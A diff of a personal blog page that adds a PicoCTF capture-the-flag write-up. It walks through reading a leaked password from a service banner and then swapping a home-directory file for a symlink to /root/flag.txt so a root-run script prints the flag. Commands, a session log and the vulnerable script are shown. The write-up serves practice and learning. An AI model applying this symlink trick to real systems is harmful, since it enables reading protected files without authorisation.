@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>My messy collection </title>
+	<title>My messy collection  | dont-you-love-banners</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.135.0">
 	
@@ -27,9 +27,6 @@
 
 	
 
-	
-	<link rel="alternate" href="/series/index.xml" type="application/rss+xml" title="My messy collection">
-	<link rel="feed" href="/series/index.xml" type="application/rss+xml" title="My messy collection">
 	
 	
 	
@@ -141,16 +138,180 @@ onload='renderMathInElement(document.body);'></script>
 		<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
 			<div
 				class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
-				<div class="pb-4">
-    <h1 >
-        <a href="/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
-    </h1>
+				
+<div>
+	<h2>
+		<a href="/" title="My messy collection" class="heading font-cursive icon">My messy collection</a>
+	</h2>
 </div>
-<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
+<h1 class="pt-2">dont-you-love-banners</h1>
+
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">Writeup</h3>
+
+<div class="flex flex-wrap justify-end pt-2 "><div class="md:flex-grow-0 font-light">
+	
+	
+	
+	
+	<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400"
+		href='/categories/picoctf'>PicoCTF</a>&nbsp;&#47;
+	
+	<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400"
+		href='/categories/general-skills'>General skills</a>
+	
+	
+	
+
+	
+	&nbsp;&nbsp;
+	
+
+	
+	
+	
+	
+	<a class="post-taxonomy-tag text-eucalyptus-500"
+		href='/tags/ctf'>CTF</a>&nbsp;&#47;
+	
+	<a class="post-taxonomy-tag text-eucalyptus-500"
+		href='/tags/completed'>Completed</a>
+	
+	
+	
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
+		datetime="2024-10-24T15:32:01&#43;03:00">2024-10-24</time>
+</div>
+
+<hr />
+
+
+			</div>
+		</header>
+		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+			
+
+<article>
+	<section class="mx-auto content">
+		<div class="c-rich-text"><h3 id="level-description">Level Description</h3>
+<p>Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 55626. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 59416. From the above information abuse the machine and find the flag in the /root directory.</p>
+<h3 id="doc">Doc</h3>
+<p><a href="https://www.freecodecamp.org/news/symlink-tutorial-in-linux-how-to-create-and-remove-a-symbolic-link/">Symlinks.</a></p>
+<h3 id="solution">Solution</h3>
+<p>Logging in on the nc connection provided hits you with a password request.</p>
+<pre tabindex="0"><code>03:35:14 archie@Archie ~ → nc tethys.picoctf.net 52675
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password?
+</code></pre><p>The next logical step is to investigate the netcat in the header in order to get the &ldquo;leaked&rdquo; information.</p>
+<pre tabindex="0"><code>03:36:19 archie@Archie ~ → nc tethys.picoctf.net 65227
+SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
+</code></pre><p>That gives you the password and next, you are prompted with some general questions that you can find the answers to on google :</p>
+<pre tabindex="0"><code>03:38:08 archie@Archie ~ → nc tethys.picoctf.net 52675
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password?
+My_Passw@rd_@1234
+What is the top cyber security conference in the world?
+Defcon
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+John Draper
+player@challenge:~$
+</code></pre><p>Now, you are in the machine. Let`s investigate the pwd.</p>
+<pre tabindex="0"><code>player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ cat banner
+cat banner
+*************************************
+**************WELCOME****************
+*************************************
+player@challenge:~$ cat text
+cat text
+keep digging
+</code></pre><p>This didn`t help very much but navigationg to the root directory will.</p>
+<pre tabindex="0"><code>player@challenge:/$ cd root
+cd root
+player@challenge:/root$ ls
+ls
+flag.txt  script.py
+player@challenge:/root$ cat flag.txt
+cat flag.txt
+</code></pre><p><strong>script.py :</strong></p>
+<pre tabindex="0"><code>import os
+import pty
+
+incorrect_ans_reply = &#34;Lol, good try, try again and good luck\n&#34;
+
+if __name__ == &#34;__main__&#34;:
+    try:
+      with open(&#34;/home/player/banner&#34;, &#34;r&#34;) as f:
+        print(f.read())
+    except:
+      print(&#34;*********************************************&#34;)
+      print(&#34;***************DEFAULT BANNER****************&#34;)
+      print(&#34;*Please supply banner in /home/player/banner*&#34;)
+      print(&#34;*********************************************&#34;)
+
+try:
+    request = input(&#34;what is the password? \n&#34;).upper()
+    while request:
+        if request == &#39;MY_PASSW@RD_@1234&#39;:
+            text = input(&#34;What is the top cyber security conference in the world?\n&#34;).upper()
+            if text == &#39;DEFCON&#39; or text == &#39;DEF CON&#39;:
+                output = input(
+                    &#34;the first hacker ever was known for phreaking(making free phone calls), who was it?\n&#34;).upper()
+                if output == &#39;JOHN DRAPER&#39; or output == &#39;JOHN THOMAS DRAPER&#39; or output == &#39;JOHN&#39; or output== &#39;DRAPER&#39;:
+                    scmd = &#39;su - player&#39;
+                    pty.spawn(scmd.split(&#39; &#39;))
+
+                else:
+                    print(incorrect_ans_reply)
+            else:
+                print(incorrect_ans_reply)
+        else:
+            print(incorrect_ans_reply)
+            break
+
+except:
+    KeyboardInterrupt
+</code></pre><p>The interesting part of all of this is the fact that the script reads the banner file in your home directory using elevated priviledges. This basically boils down to the fact that if you could somehow change the file from banner to flag.txt you could in theory get the password for the next level. Here is where symlinks come in handy. They are basically the same thing as a shortcut on windows. The taught process is that we remove the file, create a link to the file that we actually want to read then run the script.</p>
+<pre tabindex="0"><code>player@challenge:~$ rm banner
+rm banner
+player@challenge:~$ ls
+ls
+text
+player@challenge:~$ ln -s /root/flag.txt banner
+ln -s /root/flag.txt banner
+player@challenge:~$ ls
+ls
+banner  text
+</code></pre><p>Now, when you log into the same instance once again, the script will execute and hopefully spit out the password.</p>
+<p><strong>Next login :</strong></p>
+<pre tabindex="0"><code>03:49:07 archie@Archie ~ → nc tethys.picoctf.net 52675
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
+</code></pre></div>
+	</section>
+
+
+</article>
+
+		</main>
+		<div class="w-full h-0 flex-none order-3"></div>
+		<aside role="contentinfo"
+			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+				
+	<div class="md:max-w-xs  flex flex-col md:items-end">
+	<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
 	
 	
 	<li class="px-1 md:px-0">
-		<a href="/post/" title="Posts page" >
+		<a href="/post/" title="Posts page" 
+			class="font-medium text-medium-red-violet-600 hover:text-medium-red-violet-400" >
 			Posts
 		</a>
 	</li>
@@ -176,7 +337,6 @@ onload='renderMathInElement(document.body);'></script>
 	
 	
 	
-	
 	<div id="fastSearch" class="m-0">
 		<input id="searchInput" type="text" size=10 
 			class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
@@ -187,185 +347,6 @@ onload='renderMathInElement(document.body);'></script>
 	</div>
 	
 </ul>
-			</div>
-		</header>
-		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
-			
-
-
-<article>
-	<div>
-		
-	</div>
-</article>
-<div>
-	<section>
-		
-	</section>
-</div>
-
-		</main>
-		<div class="w-full h-0 flex-none order-3"></div>
-		<aside role="contentinfo"
-			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
-			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
-				
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="md:max-w-xs  flex flex-col md:items-end pt-2">
 	
 
 <div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start   max-h-16">
@@ -419,16 +400,76 @@ onload='renderMathInElement(document.body);'></script>
 	
 </div>
 
-	<div class="a-gray text-sm text-gray-500 leading-tight">
+	<div class="text-sm text-gray-500 leading-tight a-gray">
 		
-			77 pages, 24592 words in total.
+		<br />
+		508 words in this page.
 	</div>
 </div>
+
 			</div>
 		</aside>
 		<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
 			
-			
+<hr class="double-line" />
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+    
+    <a class="flex-grow-0" href="/post/picoctf2/">
+        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
+            height="24">
+            <path fill="none" d="M0 0h24v24H0z" />
+            <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
+        Picker IV
+    </a>
+    
+    
+</div>
+<div >
+
+
+
+<div class="font-serif pb-2 flex align-start leading-loose">
+	<span class="heading pr-6 leading-loose">Related</span>
+	<span >
+		
+			<a href="/post/picoctf2/">Picker IV</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/picoctf1/">Custom Encryption</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas24/">Natas-Level 24</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas23/">Natas-Level 23</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas22/">Natas-Level 22</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas21/">Natas-Level 21</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas20/">Natas-Level 20</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas19/">Natas-Level 19</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas18/">Natas-Level 18</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas17/">Natas-Level 17</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas16/">Natas-Level 16</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas15/">Natas-Level 15</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas14/">Natas-Level 14</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas13/">Natas-Level 13</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/natas12/">Natas-Level 12</a>
+		
+</span>
+</div>
+
+</div>
+<div class="pb-2">
+    
+</div>
+
 		</footer>
 		
 
